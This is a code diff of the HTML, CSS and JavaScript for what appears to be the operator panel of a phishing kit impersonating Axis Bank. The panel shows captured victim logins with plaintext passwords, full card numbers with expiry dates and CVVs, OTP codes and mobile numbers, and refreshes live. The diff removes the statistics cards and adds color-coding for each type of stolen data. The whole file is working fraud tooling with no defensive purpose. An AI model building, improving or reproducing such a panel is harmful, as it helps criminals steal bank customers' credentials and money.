@@ -104,77 +104,9 @@
             letter-spacing: 1px;
         }
         
-        /* Stats Cards */
-        .stats-container {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 25px;
-            padding: 30px 40px;
-        }
-        
-        .stat-card {
-            background: white;
-            border-radius: 12px;
-            padding: 25px;
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08);
-            display: flex;
-            align-items: center;
-            transition: all 0.3s ease;
-            border-top: 5px solid #d1003a;
-        }
-        
-        .stat-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 12px 25px rgba(0, 0, 0, 0.12);
-        }
-        
-        .stat-icon {
-            width: 60px;
-            height: 60px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-right: 20px;
-            font-size: 26px;
-        }
-        
-        .login-stat .stat-icon {
-            background: rgba(209, 0, 58, 0.1);
-            color: #d1003a;
-        }
-        
-        .credit-stat .stat-icon {
-            background: rgba(255, 153, 0, 0.1);
-            color: #ff9900;
-        }
-        
-        .otp-stat .stat-icon {
-            background: rgba(0, 150, 0, 0.1);
-            color: #009600;
-        }
-        
-        .total-stat .stat-icon {
-            background: rgba(100, 100, 255, 0.1);
-            color: #6464ff;
-        }
-        
-        .stat-info h3 {
-            font-size: 36px;
-            font-weight: bold;
-            color: #222;
-            margin-bottom: 5px;
-        }
-        
-        .stat-info p {
-            color: #666;
-            font-size: 15px;
-            font-weight: 500;
-        }
-        
         /* Main Content */
         .dashboard-content {
-            padding: 0 40px 40px;
+            padding: 30px 40px 40px;
             max-width: 1400px;
             margin: 0 auto;
         }
@@ -219,12 +151,12 @@
             border-radius: 12px;
             box-shadow: 0 8px 25px rgba(0, 0, 0, 0.08);
             overflow: hidden;
-            max-height: 600px;
+            max-height: 700px;
             overflow-y: auto;
             border: 1px solid #eee;
         }
         
-        /* Individual Submission Card */
+        /* Individual Submission Card - Different Colors */
         .submission-card {
             padding: 25px 30px;
             border-bottom: 1px solid #f0f0f0;
@@ -233,17 +165,46 @@
         }
         
         .submission-card:hover {
-            background: #f9f9f9;
+            transform: translateX(5px);
+        }
+        
+        /* Card Submission - RED (#d1003a) */
+        .card-submission {
+            border-left: 5px solid #d1003a;
+            background: rgba(209, 0, 58, 0.02);
+        }
+        
+        .card-submission:hover {
+            background: rgba(209, 0, 58, 0.05);
+        }
+        
+        /* Login Submission - BLUE (#0066cc) */
+        .login-submission {
+            border-left: 5px solid #0066cc;
+            background: rgba(0, 102, 204, 0.02);
+        }
+        
+        .login-submission:hover {
+            background: rgba(0, 102, 204, 0.05);
+        }
+        
+        /* OTP Submission - GREEN (#00aa00) */
+        .otp-submission {
+            border-left: 5px solid #00aa00;
+            background: rgba(0, 170, 0, 0.02);
+        }
+        
+        .otp-submission:hover {
+            background: rgba(0, 170, 0, 0.05);
         }
         
         .submission-card.new {
             animation: blinkCard 5s;
-            border-left: 5px solid #d1003a;
         }
         
         @keyframes blinkCard {
-            0%, 100% { background: white; }
-            10%, 30%, 50%, 70%, 90% { background: rgba(209, 0, 58, 0.05); }
+            0%, 100% { opacity: 1; }
+            10%, 30%, 50%, 70%, 90% { opacity: 0.7; }
         }
         
         .new-badge {
@@ -270,27 +231,31 @@
             gap: 15px;
         }
         
-        .card-type {
-            padding: 8px 20px;
-            border-radius: 20px;
-            font-size: 13px;
+        .submission-type {
+            padding: 10px 25px;
+            border-radius: 25px;
+            font-size: 16px;
             font-weight: bold;
             color: white;
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
         }
         
-        .type-login {
+        /* Card Type - RED */
+        .type-card {
             background: linear-gradient(135deg, #d1003a, #ff3366);
         }
         
-        .type-credit {
-            background: linear-gradient(135deg, #ff9900, #ffcc00);
+        /* Login Type - BLUE */
+        .type-login {
+            background: linear-gradient(135deg, #0066cc, #3399ff);
         }
         
+        /* OTP Type - GREEN */
         .type-otp {
-            background: linear-gradient(135deg, #009600, #00cc00);
+            background: linear-gradient(135deg, #00aa00, #00dd00);
         }
         
         .card-time {
@@ -298,14 +263,15 @@
             font-size: 14px;
             font-weight: 500;
             background: #f5f5f5;
-            padding: 6px 15px;
+            padding: 8px 18px;
             border-radius: 20px;
+            border: 1px solid #eee;
         }
         
         .card-details {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 20px;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 25px;
             margin-bottom: 15px;
         }
         
@@ -316,38 +282,71 @@
         .detail-label {
             font-size: 12px;
             color: #888;
-            margin-bottom: 5px;
+            margin-bottom: 8px;
             text-transform: uppercase;
             letter-spacing: 0.5px;
             font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
         
         .detail-value {
-            font-size: 15px;
+            font-size: 16px;
             font-weight: 500;
             color: #333;
             word-break: break-word;
-            padding: 10px;
+            padding: 12px 15px;
             background: #f8f8f8;
-            border-radius: 6px;
-            border-left: 3px solid #d1003a;
+            border-radius: 8px;
+            border: 1px solid #eee;
+        }
+        
+        /* Different border colors for each type */
+        .card-submission .detail-value {
+            border-left: 4px solid #d1003a;
+        }
+        
+        .login-submission .detail-value {
+            border-left: 4px solid #0066cc;
+        }
+        
+        .otp-submission .detail-value {
+            border-left: 4px solid #00aa00;
         }
         
         .page-source {
             display: inline-block;
-            background: #eef5ff;
-            color: #0066cc;
-            padding: 6px 15px;
+            padding: 8px 18px;
             border-radius: 15px;
             font-size: 13px;
             font-weight: 500;
             margin-top: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        /* Different page source colors */
+        .card-submission .page-source {
+            background: rgba(209, 0, 58, 0.1);
+            color: #d1003a;
+        }
+        
+        .login-submission .page-source {
+            background: rgba(0, 102, 204, 0.1);
+            color: #0066cc;
+        }
+        
+        .otp-submission .page-source {
+            background: rgba(0, 170, 0, 0.1);
+            color: #00aa00;
         }
         
         /* Empty State */
         .empty-state {
             text-align: center;
-            padding: 60px 20px;
+            padding: 80px 20px;
             color: #888;
         }
         
@@ -409,10 +408,6 @@
         
         /* Responsive Design */
         @media (max-width: 1024px) {
-            .stats-container {
-                grid-template-columns: repeat(2, 1fr);
-            }
-            
             .card-details {
                 grid-template-columns: repeat(2, 1fr);
             }
@@ -426,13 +421,8 @@
                 gap: 20px;
             }
             
-            .stats-container {
-                grid-template-columns: 1fr;
-                padding: 20px;
-            }
-            
             .dashboard-content {
-                padding: 0 20px 20px;
+                padding: 20px;
             }
             
             .section-header {
@@ -449,6 +439,15 @@
                 flex-direction: column;
                 align-items: flex-start;
             }
+            
+            .submission-type {
+                width: 100%;
+                justify-content: center;
+            }
+            
+            .card-time {
+                align-self: flex-start;
+            }
         }
         
         /* Time badge for new submissions */
@@ -459,8 +458,22 @@
             background: #f0f0f0;
             color: #666;
             font-size: 11px;
-            padding: 3px 10px;
+            padding: 4px 12px;
             border-radius: 10px;
+            font-weight: 500;
+        }
+        
+        /* Icon styling */
+        .type-icon {
+            font-size: 20px;
+        }
+        
+        .label-icon {
+            font-size: 14px;
+        }
+        
+        .page-icon {
+            font-size: 14px;
         }
     </style>
 </head>
@@ -480,41 +493,6 @@
             <div class="live-text">⭕ LIVE</div>
         </div>
     </header>
-    
-    <!-- Statistics -->
-    <div class="stats-container">
-        <div class="stat-card login-stat">
-            <div class="stat-icon">👤</div>
-            <div class="stat-info">
-                <h3 id="loginCount">0</h3>
-                <p>Login Submissions</p>
-            </div>
-        </div>
-        
-        <div class="stat-card credit-stat">
-            <div class="stat-icon">💳</div>
-            <div class="stat-info">
-                <h3 id="creditCount">0</h3>
-                <p>Credit Card Submissions</p>
-            </div>
-        </div>
-        
-        <div class="stat-card otp-stat">
-            <div class="stat-icon">🔢</div>
-            <div class="stat-info">
-                <h3 id="otpCount">0</h3>
-                <p>OTP Submissions</p>
-            </div>
-        </div>
-        
-        <div class="stat-card total-stat">
-            <div class="stat-icon">📊</div>
-            <div class="stat-info">
-                <h3 id="totalCount">0</h3>
-                <p>Total Submissions</p>
-            </div>
-        </div>
-    </div>
     
     <!-- Submissions Section -->
     <div class="dashboard-content">
@@ -536,6 +514,12 @@
                 <p style="margin-top: 15px; font-size: 14px; color: #d1003a;">
                     New submissions will blink for 5 seconds and appear at the top
                 </p>
+                <div style="margin-top: 20px; font-size: 13px; color: #666;">
+                    <p>Different colors for different submission types:</p>
+                    <p>💳 Card Submissions: <span style="color: #d1003a;">Red</span></p>
+                    <p>🔐 Login Submissions: <span style="color: #0066cc;">Blue</span></p>
+                    <p>🔢 OTP Submissions: <span style="color: #00aa00;">Green</span></p>
+                </div>
             </div>
         </div>
     </div>
@@ -557,10 +541,6 @@
         const submissionsList = document.getElementById('submissionsList');
         const emptyState = document.getElementById('emptyState');
         const refreshTime = document.getElementById('refreshTime');
-        const loginCount = document.getElementById('loginCount');
-        const creditCount = document.getElementById('creditCount');
-        const otpCount = document.getElementById('otpCount');
-        const totalCount = document.getElementById('totalCount');
         
         // Timer variables
         let refreshCountdown = 5;
@@ -569,16 +549,6 @@
         // Load and display submissions
         function loadSubmissions() {
             const submissions = JSON.parse(localStorage.getItem('axisBankSubmissions') || '[]');
-            
-            // Update statistics
-            const loginSubmissions = submissions.filter(s => s.type === 'login').length;
-            const creditSubmissions = submissions.filter(s => s.type === 'credit').length;
-            const otpSubmissions = submissions.filter(s => s.type === 'otp').length;
-            
-            loginCount.textContent = loginSubmissions;
-            creditCount.textContent = creditSubmissions;
-            otpCount.textContent = otpSubmissions;
-            totalCount.textContent = submissions.length;
             
             // Display submissions
             displaySubmissions(submissions);
@@ -603,23 +573,30 @@
             // Display each submission
             submissions.forEach((submission, index) => {
                 const card = document.createElement('div');
-                card.className = `submission-card ${submission.isNew ? 'new' : ''}`;
                 
-                // Determine type and color
-                let typeClass, typeText, typeIcon;
+                // Determine type and set appropriate class
+                let typeClass, cardClass, typeText, typeIcon, typeColorClass;
                 if (submission.type === 'login') {
                     typeClass = 'type-login';
+                    cardClass = 'login-submission';
                     typeText = 'LOGIN SUBMISSION';
-                    typeIcon = '👤';
+                    typeIcon = '🔐';
+                    typeColorClass = 'login';
                 } else if (submission.type === 'credit') {
-                    typeClass = 'type-credit';
-                    typeText = 'CREDIT CARD SUBMISSION';
+                    typeClass = 'type-card';
+                    cardClass = 'card-submission';
+                    typeText = 'CARD SUBMISSION';
                     typeIcon = '💳';
+                    typeColorClass = 'card';
                 } else {
                     typeClass = 'type-otp';
+                    cardClass = 'otp-submission';
                     typeText = 'OTP SUBMISSION';
                     typeIcon = '🔢';
+                    typeColorClass = 'otp';
                 }
+                
+                card.className = `submission-card ${cardClass} ${submission.isNew ? 'new' : ''}`;
                 
                 // Format time
                 const time = new Date(submission.timestamp);
@@ -638,18 +615,18 @@
                 card.innerHTML = `
                     ${submission.isNew ? '<div class="new-badge">NEW</div>' : ''}
                     <div class="card-header">
-                        <span class="card-type ${typeClass}">
-                            ${typeIcon} ${typeText}
+                        <span class="submission-type ${typeClass}">
+                            <span class="type-icon">${typeIcon}</span> ${typeText}
                         </span>
                         <span class="card-time">
                             ${dateString} | ${timeString}
                         </span>
                     </div>
                     <div class="card-details">
-                        ${getSubmissionDetails(submission)}
+                        ${getSubmissionDetails(submission, typeColorClass)}
                     </div>
                     <div class="page-source">
-                        📍 From: ${getPageSource(submission.type)}
+                        <span class="page-icon">📍</span> From: ${getPageSource(submission.type)}
                     </div>
                     <div class="time-badge">
                         ID: ${submission.id}
@@ -668,57 +645,79 @@
         }
         
         // Get submission details HTML based on type
-        function getSubmissionDetails(submission) {
+        function getSubmissionDetails(submission, typeColorClass) {
             if (submission.type === 'login') {
                 return `
                     <div class="detail-item">
-                        <div class="detail-label">Customer ID</div>
+                        <div class="detail-label">
+                            <span class="label-icon">👤</span> Customer ID
+                        </div>
                         <div class="detail-value">${submission.data.loginId || 'N/A'}</div>
                     </div>
                     <div class="detail-item">
-                        <div class="detail-label">Password</div>
+                        <div class="detail-label">
+                            <span class="label-icon">🔒</span> Password
+                        </div>
                         <div class="detail-value">${submission.data.password || '••••••••'}</div>
                     </div>
                     <div class="detail-item">
-                        <div class="detail-label">Mobile Number</div>
+                        <div class="detail-label">
+                            <span class="label-icon">📱</span> Mobile Number
+                        </div>
                         <div class="detail-value">${submission.data.mobile || 'N/A'}</div>
                     </div>
                     <div class="detail-item">
-                        <div class="detail-label">Submission Time</div>
+                        <div class="detail-label">
+                            <span class="label-icon">🕐</span> Submission Time
+                        </div>
                         <div class="detail-value">${submission.data.time || 'N/A'}</div>
                     </div>
                 `;
             } else if (submission.type === 'credit') {
                 return `
                     <div class="detail-item">
-                        <div class="detail-label">Card Number</div>
+                        <div class="detail-label">
+                            <span class="label-icon">💳</span> Card Number
+                        </div>
                         <div class="detail-value">${submission.data.cardNumber || 'XXXX XXXX XXXX XXXX'}</div>
                     </div>
                     <div class="detail-item">
-                        <div class="detail-label">Expiry Date</div>
+                        <div class="detail-label">
+                            <span class="label-icon">📅</span> Expiry Date
+                        </div>
                         <div class="detail-value">${submission.data.expiry || 'MM/YY'}</div>
                     </div>
                     <div class="detail-item">
-                        <div class="detail-label">CVV</div>
+                        <div class="detail-label">
+                            <span class="label-icon">🔢</span> CVV
+                        </div>
                         <div class="detail-value">${submission.data.cvv || '•••'}</div>
                     </div>
                     <div class="detail-item">
-                        <div class="detail-label">Mobile Number</div>
+                        <div class="detail-label">
+                            <span class="label-icon">📱</span> Mobile Number
+                        </div>
                         <div class="detail-value">${submission.data.mobile || 'N/A'}</div>
                     </div>
                 `;
             } else {
                 return `
                     <div class="detail-item">
-                        <div class="detail-label">OTP Code</div>
+                        <div class="detail-label">
+                            <span class="label-icon">🔢</span> OTP Code
+                        </div>
                         <div class="detail-value">${submission.data.otpCode || 'N/A'}</div>
                     </div>
                     <div class="detail-item">
-                        <div class="detail-label">Mobile Number</div>
+                        <div class="detail-label">
+                            <span class="label-icon">📱</span> Mobile Number
+                        </div>
                         <div class="detail-value">${submission.data.mobile || 'N/A'}</div>
                     </div>
                     <div class="detail-item">
-                        <div class="detail-label">Verification Time</div>
+                        <div class="detail-label">
+                            <span class="label-icon">🕐</span> Verification Time
+                        </div>
                         <div class="detail-value">${submission.data.time || 'N/A'}</div>
                     </div>
                 `;
